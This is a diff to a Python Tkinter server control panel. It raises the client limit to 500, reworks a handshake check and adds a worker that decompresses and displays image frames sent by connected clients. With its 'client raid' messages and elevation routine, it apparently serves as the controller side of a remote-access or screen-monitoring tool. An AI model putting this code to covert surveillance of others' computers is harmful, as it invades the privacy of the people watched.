@@ -12,6 +12,11 @@ from tkextrafont import Font
 import sv_ttk as objTheme
 import ctypes
 import hashlib as HASH
+from PIL import Image, ImageTk, UnidentifiedImageError
+import io
+import zstandard as objCompressor
+import numpy
+from queue import Queue
 
 init()
 
@@ -32,7 +37,7 @@ def elevate():
         sys.exit()
 
 
-GLOBAL_MAX_CLIENTS = 5
+GLOBAL_MAX_CLIENTS = 500
 
 
 class SocketManager:
@@ -55,19 +60,30 @@ class SocketManager:
         self.current_client = 0
         self.client_infos = [{}] * max_clients
         self.current_info_index = 0
-        self.nuclearFailSafeAkaDeltaWarhead = False
         self.logIndex = 0
+        self.prev_frame = [{}] * max_clients
+        self.image_queue = Queue()
+        # UI Elements
+        self.canvas = objTK.Canvas(root, bg="black")
+        self.canvas.pack(fill=objTK.BOTH, expand=True)
         # Select Thingy idk gfys
         self.sel = selectors.DefaultSelector()
         # HAVE AT THEM LADSSSSS
-        threading.Thread(target=self.start).start()
+        threading.Thread(target=self.start, daemon=True).start()
+        threading.Thread(target=self.worker, daemon=True).start()
+
+    def worker(self):
+        while True:
+            args = self.image_queue.get()
+            self.update_image(*args)
+            # doing shit
+            self.image_queue.task_done()
 
     def start(self):
         print(Fore.BLUE + "[*] Server listening [*]" + Style.RESET_ALL)
         self.sel.register(self.server_socket, selectors.EVENT_READ, data=None)
         while True:
             events = self.sel.select(timeout=None)
-            # readable, _, _ = select.select([self.server_socket], [], [], 0.1)
             for key, mask in events:
                 sock = key.fileobj
                 if mask & selectors.EVENT_READ:
@@ -100,12 +116,52 @@ class SocketManager:
                                 + f"[*] Verifying Client [*]"
                                 + Style.RESET_ALL
                             )
-                            if (
-                                self.recv_exact(client_socket, empty_slot, 11).decode(
-                                    "utf-8"
-                                )
-                                != "CLIENT_REAL"
-                            ):
+                            try:
+                                if (
+                                    self.recv_exact(
+                                        client_socket, empty_slot, 11
+                                    ).decode("utf-8")
+                                    != "CLIENT_REAL"
+                                ):
+                                    print(
+                                        Fore.MAGENTA
+                                        + "[+] Client Failed Verification - Client Handshake Failed [+]"
+                                        + Style.RESET_ALL
+                                    )
+                                    self.handle_client_disconnection(
+                                        empty_slot, "start() - real client verifier"
+                                    )
+                                else:
+                                    print(
+                                        Fore.GREEN
+                                        + "[!] Client Verified [!]"
+                                        + Style.RESET_ALL
+                                    )
+                                    threading.Thread(
+                                        target=self.client_data_manager,
+                                        args=(client_socket, empty_slot),
+                                        daemon=True,
+                                    ).start()
+                                    print(
+                                        Fore.YELLOW
+                                        + "-// CLIENT RAID IN PROGRESS //-"
+                                        + Style.RESET_ALL
+                                    )
+                                    try:
+                                        self.sel.register(
+                                            client_socket,
+                                            selectors.EVENT_READ
+                                            | selectors.EVENT_WRITE,
+                                            data=None,
+                                        )
+                                    except KeyError:
+                                        self.sel.modify(
+                                            client_socket,
+                                            selectors.EVENT_READ
+                                            | selectors.EVENT_WRITE,
+                                            data=None,
+                                        )
+                            except UnicodeDecodeError:
                                 print(
                                     Fore.MAGENTA
                                     + "[+] Client Failed Verification - Client Handshake Failed [+]"
@@ -114,34 +170,6 @@ class SocketManager:
                                 self.handle_client_disconnection(
                                     empty_slot, "start() - real client verifier"
                                 )
-                            else:
-                                print(
-                                    Fore.GREEN
-                                    + "[!] Client Verified [!]"
-                                    + Style.RESET_ALL
-                                )
-                                threading.Thread(
-                                    target=self.client_data_manager,
-                                    args=(client_socket, empty_slot),
-                                    daemon=True,
-                                ).start()
-                                print(
-                                    Fore.YELLOW
-                                    + "-// CLIENT RAID IN PROGRESS //-"
-                                    + Style.RESET_ALL
-                                )
-                                try:
-                                    self.sel.register(
-                                        client_socket,
-                                        selectors.EVENT_READ | selectors.EVENT_WRITE,
-                                        data=None,
-                                    )
-                                except KeyError:
-                                    self.sel.modify(
-                                        client_socket,
-                                        selectors.EVENT_READ | selectors.EVENT_WRITE,
-                                        data=None,
-                                    )
                         else:
                             print(
                                 Fore.RED
@@ -256,6 +284,13 @@ class SocketManager:
                                     Fore.LIGHTBLUE_EX
                                     + f"Client: {index+1}, Header Type: {header}, Data Class: {dataclass}, Size: {size}"
                                 )
+                                if header == "D" or header == "I":
+                                    # self.update_image(
+                                    #     index,
+                                    #     decompressor.decompress(data),
+                                    #     type=header,
+                                    # )
+                                    self.image_queue.put((index, data, header))
                             else:
                                 print(HASH.sha256(data.encode()).hexdigest())
                     except BlockingIOError:
@@ -307,12 +342,33 @@ class SocketManager:
                     pass
                 sock.close()
 
+    def update_image(self, index: int, image, type):
+        decompressor = objCompressor.ZstdDecompressor()
+        try:
+            adjusted = Image.open(io.BytesIO(decompressor.decompress(image)))
+            original_width, original_height = adjusted.size
+            aspect_ratio = original_height / original_width
+
+            new_height = int(self.canvas.winfo_width() * aspect_ratio)
+            new_size = (self.canvas.winfo_width(), new_height)
+            photo = ImageTk.PhotoImage(
+                adjusted.resize(
+                    new_size,
+                    Image.Resampling.LANCZOS,
+                )
+            )
+            self.canvas.create_image(0, 0, anchor="nw", image=photo)
+            self.canvas.img_ref = photo
+            self.prev_frame[index] = adjusted
+        except (OSError, ConnectionError):
+            self.handle_client_disconnection(index, "update_image()")
+
 
 # Tkinter crap
 root = objTK.Tk()
 root.title("Server Side Control Panel")
-root.geometry("905x610")
-root.resizable(width=False, height=False)
+root.geometry("800x450")
+# root.resizable(width=False, height=False)
 if sys.platform == "win32":
     root.iconbitmap("Images/icon.ico")
 path = "Fonts/font.ttf"
